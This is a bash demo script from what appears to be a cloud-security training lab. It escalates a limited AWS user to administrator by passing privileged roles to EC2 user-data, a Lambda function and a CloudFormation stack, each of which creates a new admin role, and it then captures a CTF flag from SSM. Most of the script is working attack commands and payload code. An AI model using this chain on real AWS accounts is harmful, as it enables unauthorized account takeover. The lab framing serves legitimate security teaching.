#!/bin/bash

# Demo script for prod_role_with_multiple_privesc_paths module
# This script demonstrates multiple privilege escalation paths


# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${YELLOW}=== Pathfinding-labs Multiple Privilege Escalation Paths Demo ===${NC}"
echo "This demo shows multiple ways to escalate privileges using different AWS services"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed${NC}"
    exit 1
fi

# Disable paging for AWS CLI
export AWS_PAGER=""

# Navigate to the Terraform root directory (6 levels up from scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"

echo "Retrieving credentials from Terraform outputs..."
cd "$TERRAFORM_ROOT"

# Get the grouped module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_admin_multiple_paths_combined.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not retrieve module outputs. Make sure the scenario is deployed.${NC}"
    exit 1
fi

# Extract credentials and resource information from grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
PRIVESC_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_role_arn')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
EC2_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_admin_role_arn')
EC2_INSTANCE_PROFILE=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_admin_instance_profile_name')
LAMBDA_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.lambda_admin_role_arn')
CF_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.cloudformation_admin_role_arn')

READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "us-east-1")

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}Retrieved credentials for starting user: $STARTING_USER_NAME${NC}"
echo "Privesc Role ARN: $PRIVESC_ROLE_ARN"
echo "Region: $AWS_REGION"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

export AWS_DEFAULT_REGION="$AWS_REGION"

# [EXPLOIT] Step 1: Assume the role with multiple privilege escalation paths
echo ""
echo -e "${YELLOW}Step 1: Assuming the role with multiple privilege escalation paths${NC}"
echo "Role ARN: $PRIVESC_ROLE_ARN"

use_starting_creds
# Assume the role
show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo")
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role${NC}"

ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text 2>/dev/null)
echo "Account ID: $ACCOUNT_ID"

# [OBSERVATION] Step 3: Check current permissions
echo ""
echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
# Check what we can do currently
echo "Current caller identity:"
show_cmd "Attacker" "aws sts get-caller-identity"
aws sts get-caller-identity

echo ""
echo -e "${BLUE}=== EC2 Privilege Escalation Path ===${NC}"
# [EXPLOIT] Step 4: Create EC2 instance with admin role
echo -e "${YELLOW}Step 4: Creating EC2 instance with admin role${NC}"

echo "EC2 Admin Role ARN: $EC2_ROLE_ARN"

# Create user data script that will create a new admin role
cat > /tmp/ec2-userdata.sh << EOF
#!/bin/bash
# This script runs on the EC2 instance and creates a new admin role
aws iam create-role --role-name "privesc-demo-ec2-admin-role" --assume-role-policy-document '{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER_NAME}"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}' --region $AWS_REGION

aws iam attach-role-policy --role-name "privesc-demo-ec2-admin-role" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" --region $AWS_REGION

echo "EC2 instance created admin role: privesc-demo-ec2-admin-role"
EOF

# Get the latest Amazon Linux 2 AMI ID for us-west-2
echo "🔍 Getting latest Amazon Linux 2 AMI ID for us-west-2..."
AMI_ID=$(aws ec2 describe-images \
    --owners amazon \
    --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text \
    --region $AWS_REGION)

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo "❌ Failed to get AMI ID, falling back to hardcoded value"
    AMI_ID="ami-0f33409099fdfd1e0"
else
    echo "✅ Found AMI ID: $AMI_ID"
fi

# Create EC2 instance
show_attack_cmd "Attacker" "aws ec2 run-instances --region $AWS_REGION --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name=$EC2_INSTANCE_PROFILE --user-data file:///tmp/ec2-userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'"
aws ec2 run-instances --region $AWS_REGION \
    --image-id $AMI_ID \
    --instance-type t3.micro \
    --iam-instance-profile Name="$EC2_INSTANCE_PROFILE" \
    --user-data file:///tmp/ec2-userdata.sh \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'

echo -e "${GREEN}✓ EC2 instance created with admin role${NC}"

echo ""
echo -e "${BLUE}=== Lambda Privilege Escalation Path ===${NC}"
# [EXPLOIT] Step 5: Create Lambda function with admin role
echo -e "${YELLOW}Step 5: Creating Lambda function with admin role${NC}"

echo "Lambda Admin Role ARN: $LAMBDA_ROLE_ARN"

# Create Lambda function code (use variable expansion to embed current starting user)
cat > /tmp/lambda_function.py << EOF
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    account_id = context.invoked_function_arn.split(':')[4]

    try:
        iam.create_role(
            RoleName='privesc-demo-lambda-admin-role',
            AssumeRolePolicyDocument=json.dumps({
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::" + account_id + ":user/$STARTING_USER_NAME"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            })
        )

        iam.attach_role_policy(
            RoleName='privesc-demo-lambda-admin-role',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )

        return {
            'statusCode': 200,
            'body': json.dumps('Lambda created admin role: privesc-demo-lambda-admin-role')
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
EOF

# Create zip file for Lambda function
cd /tmp
zip lambda_function.zip lambda_function.py
cd - > /dev/null

# Create Lambda function
show_attack_cmd "Attacker" "aws lambda create-function --function-name privesc-demo-lambda --runtime python3.9 --role "$LAMBDA_ROLE_ARN" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --region $AWS_REGION"
aws lambda create-function \
    --function-name privesc-demo-lambda \
    --runtime python3.9 \
    --role "$LAMBDA_ROLE_ARN" \
    --handler lambda_function.lambda_handler \
    --zip-file fileb:///tmp/lambda_function.zip \
    --region $AWS_REGION

echo "Waiting for Lambda function to be ready..."
if ! aws lambda wait function-active --function-name privesc-demo-lambda --region $AWS_REGION; then
    echo "Wait command failed, using fallback sleep..."
    sleep 30
fi

# Invoke the Lambda function
show_attack_cmd "Attacker" "aws lambda invoke --function-name privesc-demo-lambda --region $AWS_REGION /tmp/lambda-response.json"
aws lambda invoke \
    --function-name privesc-demo-lambda \
    --region $AWS_REGION \
    /tmp/lambda-response.json

echo -e "${GREEN}✓ Lambda function created and executed with admin role${NC}"

echo ""
echo -e "${BLUE}=== CloudFormation Privilege Escalation Path ===${NC}"
# [EXPLOIT] Step 6: Create CloudFormation stack with admin role
echo -e "${YELLOW}Step 6: Creating CloudFormation stack with admin role${NC}"

echo "CloudFormation Admin Role ARN: $CF_ROLE_ARN"

# Create CloudFormation template
cat > /tmp/cf-template.yaml << EOF
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  PrivescDemoAdminRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: privesc-demo-cf-admin-role
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: !Sub 'arn:aws:iam::\${AWS::AccountId}:user/${STARTING_USER_NAME}'
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
Outputs:
  AdminRoleArn:
    Description: ARN of the created admin role
    Value: !GetAtt PrivescDemoAdminRole.Arn
    Export:
      Name: PrivescDemoAdminRoleArn
EOF

# Create CloudFormation stack
show_attack_cmd "Attacker" "aws cloudformation create-stack --stack-name privesc-demo-cf-stack --template-body file:///tmp/cf-template.yaml --capabilities CAPABILITY_NAMED_IAM --role-arn "$CF_ROLE_ARN" --region $AWS_REGION"
aws cloudformation create-stack \
    --stack-name privesc-demo-cf-stack \
    --template-body file:///tmp/cf-template.yaml \
    --capabilities CAPABILITY_NAMED_IAM \
    --role-arn "$CF_ROLE_ARN" \
    --region $AWS_REGION

echo "Waiting for CloudFormation stack to complete..."
use_readonly_creds
if ! aws cloudformation wait stack-create-complete --stack-name privesc-demo-cf-stack --region $AWS_REGION; then
    echo "Wait command failed, using fallback sleep..."
    sleep 30
fi

echo -e "${GREEN}✓ CloudFormation stack created with admin role${NC}"


# [OBSERVATION] Step 7: Verify privilege escalation
echo ""
echo -e "${YELLOW}Step 7: Verifying privilege escalation${NC}"
echo "Waiting for all resources to be ready..."
sleep 15
echo "Checking for created admin roles..."

# # Check for EC2 created role
# if aws --region $AWS_REGION iam get-role --role-name "privesc-demo-ec2-admin-role" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
#     echo -e "${GREEN}✓ EC2 created admin role: privesc-demo-ec2-admin-role${NC}"
# else
#     echo -e "${YELLOW}⚠ EC2 admin role not found (may still be creating)${NC}"
# fi

# # Check for Lambda created role
# if aws --region $AWS_REGION iam get-role --role-name "privesc-demo-lambda-admin-role" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
#     echo -e "${GREEN}✓ Lambda created admin role: privesc-demo-lambda-admin-role${NC}"
# else
#     echo -e "${YELLOW}⚠ Lambda admin role not found${NC}"
# fi

# # Check for CloudFormation created role
# if aws --region $AWS_REGION iam get-role --role-name "privesc-demo-cf-admin-role" --profile pl-pathfinding-starting-user-prod &> /dev/null; then
#     echo -e "${GREEN}✓ CloudFormation created admin role: privesc-demo-cf-admin-role${NC}"
# else
#     echo -e "${YELLOW}⚠ CloudFormation admin role not found${NC}"
# fi

echo ""
echo -e "${BLUE}=== Testing Role Assumption ===${NC}"
# [OBSERVATION] Step 8: Test admin role access
echo -e "${YELLOW}Step 8: Testing admin role access${NC}"

# Test EC2 admin role (created by EC2 user-data payload)
echo "Testing EC2 admin role..."
EC2_ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-ec2-admin-role"
use_starting_creds
EC2_CREDS=$(aws sts assume-role --role-arn "$EC2_ADMIN_ROLE_ARN" --role-session-name "test-ec2-admin" 2>/dev/null)
if [ -n "$EC2_CREDS" ]; then
    export AWS_ACCESS_KEY_ID=$(echo "$EC2_CREDS" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$EC2_CREDS" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$EC2_CREDS" | jq -r '.Credentials.SessionToken')
    USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
    if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
        echo -e "${GREEN}✓ EC2 admin role works! Can list users: $USER_LIST${NC}"
    else
        echo -e "${GREEN}✓ EC2 admin role works! (Admin access confirmed)${NC}"
    fi
else
    echo -e "${YELLOW}⚠ EC2 admin role not yet assumable (EC2 instance may still be running user-data)${NC}"
fi

# Test Lambda admin role (created by Lambda payload)
echo "Testing Lambda admin role..."
LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-lambda-admin-role"
use_starting_creds
LAMBDA_CREDS=$(aws sts assume-role --role-arn "$LAMBDA_ADMIN_ROLE_ARN" --role-session-name "test-lambda-admin" 2>/dev/null)
if [ -n "$LAMBDA_CREDS" ]; then
    export AWS_ACCESS_KEY_ID=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.SessionToken')
    USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
    if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
        echo -e "${GREEN}✓ Lambda admin role works! Can list users: $USER_LIST${NC}"
    else
        echo -e "${GREEN}✓ Lambda admin role works! (Admin access confirmed)${NC}"
    fi
else
    echo -e "${RED}✗ Lambda admin role assumption failed${NC}"
fi

# Test CloudFormation admin role (created by CloudFormation stack)
echo "Testing CloudFormation admin role..."
CF_ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-cf-admin-role"
use_starting_creds
CF_CREDS=$(aws sts assume-role --role-arn "$CF_ADMIN_ROLE_ARN" --role-session-name "test-cf-admin" 2>/dev/null)
if [ -n "$CF_CREDS" ]; then
    export AWS_ACCESS_KEY_ID=$(echo "$CF_CREDS" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$CF_CREDS" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$CF_CREDS" | jq -r '.Credentials.SessionToken')
    USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
    if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
        echo -e "${GREEN}✓ CloudFormation admin role works! Can list users: $USER_LIST${NC}"
    else
        echo -e "${GREEN}✓ CloudFormation admin role works! (Admin access confirmed)${NC}"
    fi
else
    echo -e "${YELLOW}⚠ CloudFormation admin role not yet assumable (stack may still be completing)${NC}"
fi

# [EXPLOIT] Step 9: Capture the CTF flag using admin credentials
# Assume the Lambda-created admin role (most reliably synchronous of the three paths)
# and use those admin credentials to read the scenario flag from SSM Parameter Store.
echo ""
echo -e "${YELLOW}Step 9: Capturing CTF flag from SSM Parameter Store${NC}"
use_starting_creds
LAMBDA_ADMIN_ROLE_ARN_FOR_FLAG="arn:aws:iam::${ACCOUNT_ID}:role/privesc-demo-lambda-admin-role"
ADMIN_CREDS_FOR_FLAG=$(aws sts assume-role \
    --role-arn "$LAMBDA_ADMIN_ROLE_ARN_FOR_FLAG" \
    --role-session-name "flag-capture" 2>/dev/null)
if [ -n "$ADMIN_CREDS_FOR_FLAG" ]; then
    export AWS_ACCESS_KEY_ID=$(echo "$ADMIN_CREDS_FOR_FLAG" | jq -r '.Credentials.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo "$ADMIN_CREDS_FOR_FLAG" | jq -r '.Credentials.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo "$ADMIN_CREDS_FOR_FLAG" | jq -r '.Credentials.SessionToken')
fi
FLAG_PARAM_NAME="/pathfinding-labs/flags/multiple-paths-combined-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Clean up temp files
rm -f /tmp/ec2-userdata.sh /tmp/lambda_function.py /tmp/lambda-response.json /tmp/cf-template.yaml

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_NAME (limited permissions)"
echo "2. Assumed role: pl-prod-role-with-multiple-privesc-paths"
echo "3. Launched EC2 instance with admin role (pl-prod-ec2-admin-role) via PassRole + ec2:RunInstances"
echo "4. Created Lambda function with admin role (pl-prod-lambda-admin-role) via PassRole + lambda:CreateFunction"
echo "5. Deployed CloudFormation stack with admin role (pl-prod-cloudformation-admin-role) via PassRole + cloudformation:CreateStack"
echo "6. Each compute payload created a new admin IAM role trusting the starting user"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER_NAME"
echo -e "  → (sts:AssumeRole) → pl-prod-role-with-multiple-privesc-paths"
echo -e "  → (iam:PassRole + ec2:RunInstances / lambda:CreateFunction / cloudformation:CreateStack)"
echo -e "  → New Admin Role (created by compute payload)"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
echo "./cleanup_attack.sh or use the plabs TUI/CLI"

# Standardized test results output
echo "TEST_RESULT:multiple_paths_combined:SUCCESS"
echo "TEST_DETAILS:multiple_paths_combined:Successfully demonstrated EC2, Lambda, and CloudFormation privilege escalation paths and captured CTF flag"
echo "TEST_METRICS:multiple_paths_combined:paths_tested=3,admin_roles_created=3,flag_captured=true"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
